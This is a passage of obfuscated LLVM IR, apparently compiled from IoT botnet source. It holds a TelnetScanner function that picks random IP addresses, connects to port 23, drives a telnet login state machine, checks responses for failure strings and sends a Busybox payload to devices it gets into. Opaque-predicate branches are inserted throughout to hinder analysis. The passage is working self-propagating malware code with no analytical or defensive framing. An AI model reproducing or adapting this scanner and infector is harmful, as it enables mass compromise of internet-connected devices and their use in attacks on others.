  %1025 = call i64 @time(i64* null) #5
  %1026 = call i32 @rand_cmwc()
  %1027 = zext i32 %1026 to i64
  %_ = sub i64 0, %1025
  %gen = add i64 %_, %1027
  %_1 = sub i64 0, %1025
  %gen2 = add i64 %_1, %1027
  %_3 = shl i64 %1025, %1027
  %1028 = xor i64 %1025, %1027
  %1029 = trunc i64 %1028 to i32
  call void @srand(i32 %1029) #5
  %1030 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1019, i32 0, i32 0
  store i16 2, i16* %1030, align 4
  %1031 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1032 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1019, i32 0, i32 1
  store i16 %1031, i16* %1032, align 2
  %1033 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1019, i32 0, i32 3
  %1034 = getelementptr inbounds [8 x i8], [8 x i8]* %1033, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1034, i8 0, i64 8, i32 4, i1 false)
  %1035 = call noalias i8* @malloc(i64 313) #5
  store i8* %1035, i8** %1018, align 8
  %1036 = load i8*, i8** %1018, align 8
  call void @llvm.memset.p0i8.i64(i8* %1036, i8 0, i64 313, i32 1, i1 false)
  %1037 = load i32, i32* %1011, align 4
  %1038 = zext i32 %1037 to i64
  %1039 = call i8* @llvm.stacksave()
  store i8* %1039, i8** %1020, align 8
  %1040 = alloca %struct.telstate_t, i64 %1038, align 16
  %1041 = bitcast %struct.telstate_t* %1040 to i8*
  %1042 = load i32, i32* %1011, align 4
  %1043 = sext i32 %1042 to i64
  %_4 = sub i64 0, %1043
  %gen5 = add i64 %_4, 5
  %_6 = sub i64 %1043, 5
  %gen7 = mul i64 %_6, 5
  %_8 = shl i64 %1043, 5
  %_9 = sub i64 %1043, 5
  %gen10 = mul i64 %_9, 5
  %_11 = sub i64 %1043, 5
  %gen12 = mul i64 %_11, 5
  %_13 = sub i64 %1043, 5
  %gen14 = mul i64 %_13, 5
  %_15 = sub i64 %1043, 5
  %gen16 = mul i64 %_15, 5
  %_17 = sub i64 0, %1043
  %gen18 = add i64 %_17, 5
  %1044 = mul i64 %1043, 5
  call void @llvm.memset.p0i8.i64(i8* %1041, i8 0, i64 %1044, i32 16, i1 false)
  store i32 0, i32* %1007, align 4
  br label %originalBB

originalBB19alteredBB:                            ; preds = %originalBB19, %79
  store i32 0, i32* %10, align 4
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %107
  %1045 = call i64 @time(i64* null) #5
  %1046 = trunc i64 %1045 to i32
  %1047 = load i32, i32* %10, align 4
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1048
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1049, i32 0, i32 9
  store i32 %1046, i32* %1050, align 8
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %145
  %1051 = load i32, i32* %10, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 11
  %1055 = load i8*, i8** %1054, align 8
  store i8* %1055, i8** %24, align 8
  %1056 = load i32, i32* %10, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1057
  %1059 = bitcast %struct.telstate_t* %1058 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1059, i8 0, i64 40, i32 8, i1 false)
  %1060 = load i8*, i8** %24, align 8
  %1061 = load i32, i32* %10, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 11
  store i8* %1060, i8** %1064, align 8
  %1065 = call i32 @BCMSCAN()
  %1066 = load i32, i32* %10, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1067
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1068, i32 0, i32 2
  store i32 %1065, i32* %1069, align 8
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %181
  %1070 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %1070, align 4
  %1071 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1072 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %1071, i16* %1072, align 2
  %1073 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  %1074 = getelementptr inbounds [8 x i8], [8 x i8]* %1073, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1074, i8 0, i64 8, i32 4, i1 false)
  %1075 = load i32, i32* %10, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 2
  %1079 = load i32, i32* %1078, align 8
  %1080 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 2
  %1081 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1080, i32 0, i32 0
  store i32 %1079, i32* %1081, align 4
  %1082 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %1083 = load i32, i32* %10, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 0
  store i32 %1082, i32* %1086, align 8
  %1087 = load i32, i32* %10, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 0
  %1091 = load i32, i32* %1090, align 8
  %1092 = icmp eq i32 %1091, -1
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %244
  %1093 = call i32* @__errno_location() #10
  %1094 = load i32, i32* %1093, align 4
  %1095 = icmp ne i32 %1094, 115
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %275
  %1096 = load i32, i32* %10, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 3
  store i8 1, i8* %1099, align 4
  %1100 = load i32, i32* %10, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 9
  store i32 0, i32* %1103, align 8
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %301
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %419
  %1104 = load i32, i32* %10, align 4
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1105
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1106, i32 0, i32 0
  %1108 = load i32, i32* %1107, align 8
  %1109 = call i32 @sclose(i32 %1108)
  %1110 = load i32, i32* %10, align 4
  %1111 = sext i32 %1110 to i64
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1111
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1112, i32 0, i32 3
  store i8 0, i8* %1113, align 4
  %1114 = load i32, i32* %10, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 4
  store i8 1, i8* %1117, align 1
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %476
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %519
  %1118 = load i32, i32* %10, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 3
  store i8 3, i8* %1121, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %551
  %1122 = load i32, i32* %10, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 3
  store i8 0, i8* %1125, align 4
  %1126 = load i32, i32* %10, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 4
  store i8 1, i8* %1129, align 1
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %599
  %1130 = load i32, i32* %10, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 0
  %1134 = load i32, i32* %1133, align 8
  %1135 = load i32, i32* %10, align 4
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1136
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1137, i32 0, i32 11
  %1139 = load i8*, i8** %1138, align 8
  %1140 = call i32 @read_until_response(i32 %1134, i32 10000, i8* %1139, i32 312, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %1141 = icmp ne i32 %1140, 0
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %641
  %1142 = load i32, i32* %10, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 3
  store i8 5, i8* %1145, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %663
  %1146 = load i32, i32* %10, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 9
  %1150 = load i32, i32* %1149, align 8
  %_72 = sub i32 0, %1150
  %gen73 = add i32 %_72, 6
  %_74 = shl i32 %1150, 6
  %_75 = shl i32 %1150, 6
  %1151 = add i32 %1150, 6
  %1152 = zext i32 %1151 to i64
  %1153 = call i64 @time(i64* null) #5
  %1154 = icmp slt i64 %1152, %1153
  br label %originalBB71

originalBB79alteredBB:                            ; preds = %originalBB79, %707
  %1155 = load i32, i32* %10, align 4
  %1156 = sext i32 %1155 to i64
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1156
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1157, i32 0, i32 3
  store i8 0, i8* %1158, align 4
  %1159 = load i32, i32* %10, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 4
  store i8 1, i8* %1162, align 1
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %737
  %1163 = load i32, i32* %10, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1165, i32 0, i32 0
  %1167 = load i32, i32* %1166, align 8
  %1168 = load i32, i32* %10, align 4
  %1169 = sext i32 %1168 to i64
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1169
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1170, i32 0, i32 11
  %1172 = load i8*, i8** %1171, align 8
  %1173 = call i32 @read_until_response(i32 %1167, i32 10000, i8* %1172, i32 312, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1174 = icmp ne i32 %1173, 0
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %766
  %1175 = call i64 @time(i64* null) #5
  %1176 = trunc i64 %1175 to i32
  %1177 = load i32, i32* %10, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1178
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1179, i32 0, i32 9
  store i32 %1176, i32* %1180, align 8
  %1181 = load i32, i32* %10, align 4
  %1182 = sext i32 %1181 to i64
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 11
  %1185 = load i8*, i8** %1184, align 8
  %1186 = call i32 @contains_fail(i8* %1185)
  %1187 = icmp ne i32 %1186, 0
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %796
  %1188 = load i32, i32* %10, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 3
  store i8 0, i8* %1191, align 4
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %887
  call void @RemoveTempDirs()
  %1192 = call i64 @time(i64* null) #5
  %1193 = trunc i64 %1192 to i32
  %1194 = load i32, i32* %10, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 9
  store i32 %1193, i32* %1197, align 8
  %1198 = load i32, i32* %10, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 0
  %1202 = load i32, i32* %1201, align 8
  %1203 = load i8*, i8** @Busybox_Payload, align 8
  %1204 = load i8*, i8** @Busybox_Payload, align 8
  %1205 = call i64 @strlen(i8* %1204) #9
  %1206 = call i64 @send(i32 %1202, i8* %1203, i64 %1205, i32 16384)
  %1207 = icmp slt i64 %1206, 0
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %957
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %974
  %1208 = load i32, i32* %10, align 4
  %1209 = sext i32 %1208 to i64
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1209
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1210, i32 0, i32 3
  store i8 0, i8* %1211, align 4
  %1212 = load i32, i32* %10, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 4
  store i8 1, i8* %1215, align 1
  br label %originalBB103
}

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %48

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* @x.91
  %32 = load i32, i32* @y.92
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i32, i32* %4, align 4
  store i32 %39, i32* %5, align 4
  %40 = load i32, i32* @x.91
  %41 = load i32, i32* @y.92
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %48

; <label>:48:                                     ; preds = %originalBBpart2, %2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = call zeroext i16 @htons(i16 zeroext 23) #10
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %53 = getelementptr inbounds [8 x i8], [8 x i8]* %52, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %53, i8 0, i64 8, i32 4, i1 false)
  %54 = call noalias i8* @malloc(i64 1025) #5
  store i8* %54, i8** %17, align 8
  %55 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1025, i32 1, i1 false)
  %56 = load i32, i32* %5, align 4
  %57 = zext i32 %56 to i64
  %58 = call i8* @llvm.stacksave()
  store i8* %58, i8** %19, align 8
  %59 = alloca %struct.telstate_t, i64 %57, align 16
  %60 = bitcast %struct.telstate_t* %59 to i8*
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = mul i64 %62, 5
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 %63, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %64

; <label>:64:                                     ; preds = %82, %48
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %85

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %6, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %70
  %72 = bitcast %struct.telstate_t* %71 to i8*
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 40, i32 8, i1 false)
  %73 = load i32, i32* %6, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 4
  store i8 1, i8* %76, align 1
  %77 = load i8*, i8** %17, align 8
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 11
  store i8* %77, i8** %81, align 8
  br label %82

; <label>:82:                                     ; preds = %68
  %83 = load i32, i32* %6, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %6, align 4
  br label %64

; <label>:85:                                     ; preds = %64
  br label %86

; <label>:86:                                     ; preds = %1305, %85
  br label %87

; <label>:87:                                     ; preds = %86
  %88 = load i32, i32* @x.91
  %89 = load i32, i32* @y.92
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %87
  store i32 0, i32* %6, align 4
  %96 = load i32, i32* @x.91
  %97 = load i32, i32* @y.92
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %104

; <label>:104:                                    ; preds = %originalBBpart2147, %originalBBpart24
  %105 = load i32, i32* %6, align 4
  %106 = load i32, i32* %5, align 4
  %107 = icmp slt i32 %105, %106
  br i1 %107, label %108, label %1305

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @x.91
  %110 = load i32, i32* @y.92
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  %117 = load i32, i32* %6, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 9
  %121 = load i32, i32* %120, align 8
  %122 = icmp eq i32 %121, 0
  %123 = load i32, i32* @x.91
  %124 = load i32, i32* @y.92
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %122, label %131, label %138

; <label>:131:                                    ; preds = %originalBBpart28
  %132 = call i64 @time(i64* null) #5
  %133 = trunc i64 %132 to i32
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 9
  store i32 %133, i32* %137, align 8
  br label %138

; <label>:138:                                    ; preds = %131, %originalBBpart28
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 3
  %143 = load i8, i8* %142, align 4
  %144 = zext i8 %143 to i32
  switch i32 %144, label %1285 [
    i32 0, label %145
    i32 1, label %345
    i32 2, label %512
    i32 3, label %612
    i32 4, label %673
    i32 5, label %789
    i32 6, label %850
    i32 7, label %1020
    i32 8, label %1106
  ]

; <label>:145:                                    ; preds = %138
  %146 = load i32, i32* %6, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %147
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %148, i32 0, i32 4
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 1
  br i1 %152, label %153, label %173

; <label>:153:                                    ; preds = %145
  %154 = load i32, i32* %6, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 11
  %158 = load i8*, i8** %157, align 8
  store i8* %158, i8** %20, align 8
  %159 = load i32, i32* %6, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %160
  %162 = bitcast %struct.telstate_t* %161 to i8*
  call void @llvm.memset.p0i8.i64(i8* %162, i8 0, i64 40, i32 8, i1 false)
  %163 = load i8*, i8** %20, align 8
  %164 = load i32, i32* %6, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 11
  store i8* %163, i8** %167, align 8
  %168 = call i32 @telnetfindARandomIP()
  %169 = load i32, i32* %6, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 8
  br label %237

; <label>:173:                                    ; preds = %145
  %174 = load i32, i32* %6, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 4
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %181, label %220

; <label>:181:                                    ; preds = %173
  %182 = load i32, i32* %6, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %183
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %184, i32 0, i32 5
  %186 = load i8, i8* %185, align 2
  %187 = add i8 %186, 1
  store i8 %187, i8* %185, align 2
  %188 = load i32, i32* %6, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 6
  %192 = load i8, i8* %191, align 1
  %193 = add i8 %192, 1
  store i8 %193, i8* %191, align 1
  %194 = load i32, i32* %6, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 6
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i64
  %200 = icmp eq i64 %199, 7
  br i1 %200, label %201, label %206

; <label>:201:                                    ; preds = %181
  %202 = load i32, i32* %6, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 4
  store i8 1, i8* %205, align 1
  br label %1286

; <label>:206:                                    ; preds = %181
  %207 = load i32, i32* %6, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 5
  %211 = load i8, i8* %210, align 2
  %212 = zext i8 %211 to i64
  %213 = icmp eq i64 %212, 7
  br i1 %213, label %214, label %219

; <label>:214:                                    ; preds = %206
  %215 = load i32, i32* %6, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 4
  store i8 1, i8* %218, align 1
  br label %1286

; <label>:219:                                    ; preds = %206
  br label %220

; <label>:220:                                    ; preds = %219, %173
  %221 = load i32, i32* @x.91
  %222 = load i32, i32* @y.92
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %220
  %229 = load i32, i32* @x.91
  %230 = load i32, i32* @y.92
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %237

; <label>:237:                                    ; preds = %originalBBpart212, %153
  %238 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %238, align 4
  %239 = call zeroext i16 @htons(i16 zeroext 23) #10
